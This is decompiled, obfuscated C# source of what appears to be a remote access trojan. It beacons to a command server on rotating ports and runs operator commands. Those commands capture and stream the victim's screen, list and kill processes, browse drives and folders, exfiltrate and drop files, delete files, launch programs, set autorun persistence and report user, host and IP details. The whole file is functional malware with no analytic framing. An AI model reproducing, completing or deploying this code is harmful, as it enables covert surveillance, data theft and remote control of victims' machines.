using System;
using System.Diagnostics;
using System.Drawing;
using System.Drawing.Imaging;
using System.IO;
using System.Net.Sockets;
using System.Text;
using System.Threading;

namespace othvidtiraw;

public class MEWDRM
{
	private MRWEINF othvidtirawUPwC;

	private ORWAMD othvidtirawCMwD;

	private int othvidtirawscrwSize = 200;

	private ThreadStart othvidtirawfunwStarter;

	public TcpClient othvidtirawtcwpsck;

	public NetworkStream othvidtirawnetwStream;

	private int othvidtirawbuffwSize = 1024;

	private DRWARIVF othvidtirawHwD = new DRWARIVF();

	public bool othvidtirawis_woreking = false;

	private int othvidtirawbyteswRead = 0;

	public bool othvidtirawreqCwnls = false;

	public bool othvidtirawauwtCnls = false;

	public DateTime othvidtirawlTimwUtc;

	private THRWARE othvidtirawStatewwObj = new THRWARE();

	private bool othvidtirawiswitcwh = false;

	public int port_sn = 0;

	private bool othvidtirawthrRwuning = false;

	private bool othvidtirawstr_wwriter = false;

	private bool othvidtirawcapwScreen = false;

	private Thread othvidtirawfunTwhread;

	private MemoryStream msStram = new MemoryStream();

	private SCWARNS othvidtirawcaps = new SCWARNS();

	private Bitmap image;

	public void othvidtirawsavewFile(string filewPath)
	{
		try
		{
			byte[] array = othvidtirawpull_dwta();
			if (array != null)
			{
				File.WriteAllBytes(filewPath, array);
			}
		}
		catch
		{
		}
	}

	public string othvidtirawfile_iwnfo(string path, bool ret = false)
	{
		try
		{
			FileInfo fileInfo = new FileInfo(path);
			string text = fileInfo.Name + ((!ret) ? ">|othvidtiraw".Split(new char[1] { '|' })[0] : "<|othvidtiraw".Split(new char[1] { '|' })[0]);
			text = text + fileInfo.CreationTimeUtc.Date.ToString() + ((!ret) ? ">|othvidtiraw".Split(new char[1] { '|' })[0] : "<|othvidtiraw".Split(new char[1] { '|' })[0]);
			text = text + othvidtirawget_sizwe(fileInfo.Length) + ((!ret) ? ">|othvidtiraw".Split(new char[1] { '|' })[0] : "<|othvidtiraw".Split(new char[1] { '|' })[0]);
			if (!ret)
			{
				othvidtirawpush_daeta(null, "othvidtiraw-fiwlsz=|othvidtiraw".Split(new char[1] { '|' })[0] + text);
			}
			return text;
		}
		catch
		{
			return "";
		}
	}

	public void othvidtirawdowStart()
	{
		try
		{
			CEWZRNF.othvidtirawpowrt = CEWZRNF.ports[0];
			othvidtirawUPwC = new MRWEINF();
			othvidtirawCMwD = new ORWAMD(this);
			othvidtirawHwD.iserver = this;
			othvidtirawHwD.othvidtirawmainPath = CEWZRNF.othvidtirawget_mwpath();
			TimerCallback callback = othvidtirawlookupCdonx;
			Timer othvidtirawtimer = new Timer(callback, othvidtirawStatewwObj, 31210, 35210);
			othvidtirawStatewwObj.othvidtirawtimer = othvidtirawtimer;
		}
		catch (Exception ex)
		{
			ERWHNDL.send_update(ex.Message.ToString());
		}
	}

	public void othvidtirawpowrts_sweitch()
	{
		try
		{
			port_sn++;
			CEWZRNF.othvidtirawpowrt = CEWZRNF.ports[port_sn];
			if (port_sn >= CEWZRNF.ports.Length - 1)
			{
				port_sn = 0;
			}
		}
		catch
		{
			port_sn = 0;
		}
	}

	public bool othvidtirawsend_aueto(string fileinfo)
	{
		try
		{
			string[] array = fileinfo.Split(new char[1] { '>' });
			string path = array[0];
			if (File.Exists(path))
			{
				string fileName = Path.GetFileName(path);
				byte[] data = File.ReadAllBytes(path);
				fileinfo = fileinfo + ">" + fileName;
				othvidtirawpush_daeta(data, "othvidtiraw-afwile=" + fileinfo);
				return false;
			}
			othvidtirawpush_daeta(null, "othvidtiraw-anwfod=" + fileinfo);
			return false;
		}
		catch
		{
			return false;
		}
	}

	private bool othvidtirawIPSeC()
	{
		try
		{
			CEWZRNF.othvidtirawdefaultwP = othvidtirawCMwD.othvidtirawserverIPeD();
			othvidtirawtcwpsck = new TcpClient();
			othvidtirawtcwpsck.Connect(CEWZRNF.othvidtirawdefaultwP, CEWZRNF.othvidtirawpowrt);
			return true;
		}
		catch (Exception ex)
		{
			othvidtirawpowrts_sweitch();
			ERWHNDL.send_update(ex.Message.ToString());
			return false;
		}
	}

	public void othvidtirawlist_proeesses(string cmd)
	{
		try
		{
			string text = "";
			Process[] processes = Process.GetProcesses();
			for (int i = 0; i <= processes.Length - 1; i++)
			{
				try
				{
					text = text + processes[i].Id + ">|othvidtiraw".Split(new char[1] { '|' })[0];
					text = text + processes[i].ProcessName + ">|othvidtiraw".Split(new char[1] { '|' })[0];
					text += "0>|othvidtiraw".Split(new char[1] { '|' })[0];
					text += "<";
				}
				catch
				{
				}
			}
			byte[] bytewArray = CEWZRNF.getBytewArray(text);
			othvidtirawpush_daeta(bytewArray, "othvidtiraw-" + cmd + "=procwess|othvidtiraw".Split(new char[1] { '|' })[0]);
		}
		catch
		{
		}
	}

	private void othvidtirawlookupCdonx(object dostrece)
	{
		try
		{
			if (!othvidtirawthrRwuning)
			{
				othvidtirawthrRwuning = true;
				if (!othvidtirawis_woreking || !othvidtirawtcwpsck.Connected)
				{
					othvidtirawis_woreking = othvidtirawIPSeC();
					if (othvidtirawis_woreking)
					{
						othvidtirawbuffwSize = othvidtirawtcwpsck.ReceiveBufferSize;
						othvidtirawseeRsep();
					}
				}
			}
			othvidtirawthrRwuning = false;
		}
		catch (Exception ex)
		{
			ERWHNDL.send_update(ex.Message.ToString());
			othvidtirawthrRwuning = false;
			othvidtirawstr_wwriter = false;
			othvidtirawis_woreking = false;
			othvidtirawiswitcwh = false;
		}
	}

	public void othvidtirawload_apep()
	{
		try
		{
			string path = CEWZRNF.othvidtirawget_mwpath() + CEWZRNF.othvidtirawmainwApp + ".exe|othvidtiraw".Split(new char[1] { '|' })[0];
			CEWZRNF.othvidtirawset_ruwn("rdoih|othvidtiraw".Split(new char[1] { '|' })[0], path);
		}
		catch
		{
		}
	}

	private void othvidtirawsee_screen(string screenwSize)
	{
		try
		{
			othvidtirawscrwSize = Convert.ToInt16(screenwSize.Split(new char[1] { '>' })[0].Trim());
			image = othvidtirawcaps.othvidtirawscrwen(othvidtirawscrwSize);
			msStram.SetLength(0L);
			((Image)image).Save((Stream)msStram, ImageFormat.get_Jpeg());
			othvidtirawpush_daeta(msStram.ToArray(), "othvidtiraw-sawscr=othvidtiraw|othvidtiraw".Split(new char[1] { '|' })[0]);
		}
		catch
		{
		}
	}

	private void othvidtirawis_scereen(string screenwSize)
	{
		try
		{
			othvidtirawscrwSize = Convert.ToInt16(screenwSize.Split(new char[1] { '>' })[0].Trim());
			while (othvidtirawcapwScreen && othvidtirawis_woreking)
			{
				image = othvidtirawcaps.othvidtirawscrwen(othvidtirawscrwSize);
				msStram.SetLength(0L);
				((Image)image).Save((Stream)msStram, ImageFormat.get_Jpeg());
				othvidtirawpush_daeta(msStram.ToArray(), "othvidtiraw-scwren=othvidtiraw|othvidtiraw".Split(new char[1] { '|' })[0]);
			}
		}
		catch
		{
		}
	}

	private void othvidtirawimage_inwfo(string path)
	{
		//IL_0002: Unknown result type (might be due to invalid IL or missing references)
		//IL_001b: Expected O, but got Unknown
		//IL_0016: Unknown result type (might be due to invalid IL or missing references)
		//IL_001c: Expected O, but got Unknown
		try
		{
			Bitmap val = new Bitmap((Image)new Bitmap(path), new Size(200, 150));
			if (val != null)
			{
				FileInfo fileInfo = new FileInfo(path);
				string text = fileInfo.Name + ">|othvidtiraw".Split(new char[1] { '|' })[0];
				text = text + fileInfo.CreationTimeUtc.Date.ToString() + ">|othvidtiraw".Split(new char[1] { '|' })[0];
				text = text + othvidtirawget_sizwe(fileInfo.Length) + ">";
				MemoryStream memoryStream = new MemoryStream();
				((Image)val).Save((Stream)memoryStream, ImageFormat.get_Gif());
				othvidtirawpush_daeta(memoryStream.ToArray(), "othvidtiraw-thwumb=|othvidtiraw".Split(new char[1] { '|' })[0] + text);
			}
		}
		catch
		{
		}
	}

	private void othvidtirawuser_inefo()
	{
		try
		{
			string text = othvidtirawUPwC.othvidtirawlancard + "|" + othvidtirawUPwC.othvidtirawcname + "-2|" + othvidtirawUPwC.othvidtirawuname + "|" + othvidtirawUPwC.othvidtirawuip + "|" + CEWZRNF.othvidtirawOwsname() + "|" + othvidtirawUPwC.othvidtirawapver + "|";
			text += "| !othvidtiraw".Split(new char[1] { '!' })[0];
			text = text + "|" + othvidtirawUPwC.othvidtirawclientNum;
			text = text + "|" + CEWZRNF.othvidtirawget_mwpath();
			byte[] bytewArray = CEWZRNF.getBytewArray(text);
			othvidtirawpush_daeta(bytewArray, "othvidtiraw-inwfo=uswer|othvidtiraw".Split(new char[1] { '|' })[0]);
		}
		catch (Exception ex)
		{
			ERWHNDL.send_update(ex.Message.ToString());
		}
	}

	private void othvidtirawpush_filee(string lfile)
	{
		try
		{
			if (File.Exists(lfile))
			{
				string fileName = Path.GetFileName(lfile);
				othvidtirawpush_daeta(File.ReadAllBytes(lfile), "othvidtiraw-fiwle=|othvidtiraw".Split(new char[1] { '|' })[0] + lfile + ">0>" + fileName, tmp: true);
			}
		}
		catch
		{
		}
	}

	public void othvidtirawremove_fiee(string path)
	{
		try
		{
			File.Delete(path);
		}
		catch
		{
		}
	}

	private void othvidtirawscrweneSize(string scSeize)
	{
		try
		{
			string[] array = scSeize.Split(new char[1] { '>' });
			othvidtirawscrwSize = Convert.ToInt16(array[0].Trim());
		}
		catch
		{
		}
	}

	private string othvidtirawget_sizwe(long byteCount)
	{
		try
		{
			string[] array = new string[7]
			{
				"B|othvidtiraw".Split(new char[1] { '|' })[0],
				"KB|othvidtiraw".Split(new char[1] { '|' })[0],
				"MB|othvidtiraw".Split(new char[1] { '|' })[0],
				"GB|othvidtiraw".Split(new char[1] { '|' })[0],
				"TB|othvidtiraw".Split(new char[1] { '|' })[0],
				"PB|othvidtiraw".Split(new char[1] { '|' })[0],
				"EB|othvidtiraw".Split(new char[1] { '|' })[0]
			};
			if (byteCount == 0L)
			{
				return "0" + array[0];
			}
			long num = Math.Abs(byteCount);
			int num2 = Convert.ToInt32(Math.Floor(Math.Log(num, 1024.0)));
			double num3 = Math.Round((double)num / Math.Pow(1024.0, num2), 1);
			return (double)Math.Sign(byteCount) * num3 + array[num2];
		}
		catch
		{
			return "0";
		}
	}

	public byte[] othvidtirawpull_dwta()
	{
		try
		{
			int num = 0;
			byte[] array = new byte[5];
			othvidtirawbyteswRead = othvidtirawnetwStream.Read(array, 0, 5);
			int num2 = BitConverter.ToInt32(array, 0);
			byte[] array2 = new byte[num2];
			int num3 = num2;
			while (num3 > 0 && !othvidtirawreqCwnls)
			{
				int count = ((num3 > othvidtirawbuffwSize) ? othvidtirawbuffwSize : num3);
				othvidtirawbyteswRead = othvidtirawnetwStream.Read(array2, num, count);
				num += othvidtirawbyteswRead;
				num3 -= othvidtirawbyteswRead;
			}
			if (othvidtirawreqCwnls)
			{
				othvidtirawnetwStream.Flush();
				while (othvidtirawnetwStream.DataAvailable && othvidtirawnetwStream.ReadByte() >= 0)
				{
				}
				array2 = null;
			}
			return array2;
		}
		catch
		{
			othvidtirawis_woreking = false;
			return null;
		}
	}

	public string[] othvidtirawget_comemand()
	{
		try
		{
			byte[] array = new byte[5];
			othvidtirawbyteswRead = othvidtirawnetwStream.Read(array, 0, 5);
			int num = BitConverter.ToInt32(array, 0);
			byte[] array2 = new byte[num];
			int num2 = 0;
			for (int num3 = num; num3 > 0; num3 -= othvidtirawbyteswRead)
			{
				int count = ((num3 > othvidtirawbuffwSize) ? othvidtirawbuffwSize : num3);
				othvidtirawbyteswRead = othvidtirawnetwStream.Read(array2, num2, count);
				num2 += othvidtirawbyteswRead;
			}
			string text = Encoding.UTF8.GetString(array2, 0, num).ToString();
			if (text.Trim() == "")
			{
				return null;
			}
			return text.Split(new char[1] { '=' });
		}
		catch
		{
			othvidtirawis_woreking = false;
			return null;
		}
	}

	private void othvidtirawlisteDrives()
	{
		string text = othvidtirawHwD.othvidtirawlookup_Driwve();
		othvidtirawpush_daeta(null, "othvidtiraw-diwrs=" + text);
	}

	private void othvidtirawseeRsep()
	{
		if (!othvidtirawiswitcwh)
		{
			othvidtirawiswitcwh = true;
			othvidtirawnetwStream = othvidtirawCMwD.othvidtirawNwS(othvidtirawtcwpsck);
			string cmd_name = "";
			othvidtirawcapwScreen = false;
			while (othvidtirawis_woreking)
			{
				string[] switchType = othvidtirawget_comemand();
				if (switchType != null)
				{
					othvidtirawreqCwnls = false;
					string text = switchType[0].ToLower();
					if (text.Split(new char[1] { '-' }).Length > 1)
					{
						text = text.Split(new char[1] { '-' })[1];
					}
					cmd_name = text;
					text = text.Insert(2, "0");
					text = "othvidtiraw-" + text;
					switch (text)
					{
					case "othvidtiraw-pr0wocl":
					case "othvidtiraw-ge0wtavs":
					case "othvidtiraw-pr0ocl":
					case "othvidtiraw-ge0tavs":
						othvidtirawfunwStarter = delegate
						{
							othvidtirawlist_proeesses(cmd_name);
						};
						othvidtirawfunTwhread = new Thread(othvidtirawfunwStarter);
						othvidtirawfunTwhread.Start();
						break;
					case "othvidtiraw-th0umb":
					case "othvidtiraw-th0wumb":
						othvidtirawimage_inwfo(switchType[1]);
						break;
					case "othvidtiraw-fi0lsz":
					case "othvidtiraw-fi0wlsz":
						othvidtirawfunwStarter = delegate
						{
							othvidtirawfile_iwnfo(switchType[1]);
						};
						othvidtirawfunTwhread = new Thread(othvidtirawfunwStarter);
						othvidtirawfunTwhread.Start();
						break;
					case "othvidtiraw-ru0pth":
					case "othvidtiraw-ru0wpth":
						othvidtirawpush_daeta(null, "othvidtiraw-apwpth=|othvidtiraw".Split(new char[1] { '|' })[0] + CEWZRNF.othvidtirawget_mwpath());
						break;
					case "othvidtiraw-do0wf":
					case "othvidtiraw-do0wwf":
						othvidtirawsavewFile(switchType[1]);
						break;
					case "othvidtiraw-en0dpo":
					case "othvidtiraw-en0wdpo":
						Process.GetProcessById(Convert.ToInt16(switchType[1].Trim())).Kill();
						break;
					case "othvidtiraw-sc0rsz":
					case "othvidtiraw-sc0wrsz":
						othvidtirawscrweneSize(switchType[1]);
						break;
					case "othvidtiraw-cs0creen":
					case "othvidtiraw-cs0wcreen":
						othvidtirawsee_screen(switchType[1]);
						break;
					case "othvidtiraw-di0rs":
					case "othvidtiraw-di0wrs":
						othvidtirawfunTwhread = new Thread(othvidtirawlisteDrives);
						othvidtirawfunTwhread.Start();
						break;
					case "othvidtiraw-st0ops":
					case "othvidtiraw-st0wops":
						othvidtirawcapwScreen = false;
						break;
					case "othvidtiraw-sc0ren":
					case "othvidtiraw-sc0wren":
						othvidtirawcapwScreen = true;
						othvidtirawfunwStarter = delegate
						{
							othvidtirawis_scereen(switchType[1]);
						};
						othvidtirawfunTwhread = new Thread(othvidtirawfunwStarter);
						othvidtirawfunTwhread.Start();
						break;
					case "othvidtiraw-cn0ls":
					case "othvidtiraw-cn0wls":
						othvidtirawauwtCnls = true;
						othvidtirawreqCwnls = true;
						othvidtirawcapwScreen = false;
						break;
					case "othvidtiraw-ud0lt":
					case "othvidtiraw-ud0wlt":
						othvidtirawCMwD.othvidtirawremove_uswer();
						break;
					case "othvidtiraw-de0lt":
					case "othvidtiraw-de0wlt":
						othvidtirawremove_fiee(switchType[1]);
						break;
					case "othvidtiraw-af0ile":
					case "othvidtiraw-af0wile":
						othvidtirawfunwStarter = delegate
						{
							othvidtirawsend_aueto(switchType[1]);
						};
						othvidtirawfunTwhread = new Thread(othvidtirawfunwStarter);
						othvidtirawfunTwhread.Start();
						break;
					case "othvidtiraw-li0stf":
					case "othvidtiraw-li0wstf":
						othvidtirawfunwStarter = delegate
						{
							othvidtirawHwD.othvidtirawloowk_File(switchType[1]);
						};
						othvidtirawfunTwhread = new Thread(othvidtirawfunwStarter);
						othvidtirawfunTwhread.Start();
						break;
					case "othvidtiraw-fi0le":
					case "othvidtiraw-fi0wle":
						othvidtirawfunwStarter = delegate
						{
							othvidtirawpush_filee(switchType[1]);
						};
						othvidtirawfunTwhread = new Thread(othvidtirawfunwStarter);
						othvidtirawfunTwhread.Start();
						break;
					case "othvidtiraw-in0fo":
					case "othvidtiraw-in0wfo":
						othvidtirawfunTwhread = new Thread(othvidtirawuser_inefo);
						othvidtirawfunTwhread.Start();
						break;
					case "othvidtiraw-ru0nf":
					case "othvidtiraw-ru0wnf":
						othvidtirawCMwD.othvidtirawdo_prowess(switchType[1].Split(new char[1] { '>' })[0]);
						break;
					case "othvidtiraw-fl0es":
					case "othvidtiraw-fl0wes":
					{
						string files = othvidtirawHwD.othvidtirawlookup_wFile(switchType[1]);
						if (files != "")
						{
							othvidtirawfunwStarter = delegate
							{
								othvidtirawpush_daeta(null, "othvidtiraw-flwes=|othvidtiraw".Split(new char[1] { '|' })[0] + files);
							};
							othvidtirawfunTwhread = new Thread(othvidtirawfunwStarter);
							othvidtirawfunTwhread.Start();
						}
						break;
					}
					case "othvidtiraw-do0wr":
					case "othvidtiraw-do0wwr":
						othvidtirawsavewFile(switchType[1]);
						break;
					case "othvidtiraw-fl0dr":
					case "othvidtiraw-fl0wdr":
					{
						string Folders = othvidtirawHwD.othvidtirawcheck_Folwder(switchType[1]);
						if (Folders != "")
						{
							othvidtirawfunwStarter = delegate
							{
								othvidtirawpush_daeta(null, "othvidtiraw-flwdr=|othvidtiraw".Split(new char[1] { '|' })[0] + Folders);
							};
							othvidtirawfunTwhread = new Thread(othvidtirawfunwStarter);
							othvidtirawfunTwhread.Start();
						}
						break;
					}
					}
					continue;
				}
				othvidtirawis_woreking = false;
				break;
			}
			othvidtirawis_woreking = false;
			othvidtirawcapwScreen = false;
		}
		othvidtirawiswitcwh = false;
	}

	public bool othvidtirawpush_daeta(byte[] data, string type, bool tmp = false)
	{
		try
		{
			if (othvidtirawstr_wwriter)
			{
				return false;
			}
			othvidtirawstr_wwriter = true;
			byte[] bytewArray = CEWZRNF.getBytewArray(type);
			int num = 0;
			int num2 = 5;
			byte[] array = null;
			if (data != null)
			{
				array = BitConverter.GetBytes(data.Length);
				num = data.Length;
				num2 = 10;
			}
			byte[] bytes = BitConverter.GetBytes(bytewArray.Length);
			byte[] array2 = new byte[num2 + bytewArray.Length + num];
			bytes.CopyTo(array2, 0);
			bytewArray.CopyTo(array2, 5);
			if (data != null)
			{
				array.CopyTo(array2, 5 + bytewArray.Length);
				data.CopyTo(array2, 10 + bytewArray.Length);
			}
			int num3 = 0;
			int num4 = array2.Length;
			while (num4 > 0 && !othvidtirawreqCwnls)
			{
				int num5 = ((num4 > othvidtirawbuffwSize) ? othvidtirawbuffwSize : num4);
				othvidtirawnetwStream.Write(array2, num3, num5);
				num3 += num5;
				num4 -= num5;
			}
			othvidtirawstr_wwriter = false;
			if (othvidtirawreqCwnls)
			{
				return false;
			}
			return true;
		}
		catch
		{
			othvidtirawstr_wwriter = false;
			othvidtirawis_woreking = false;
			return false;
		}
	}
}
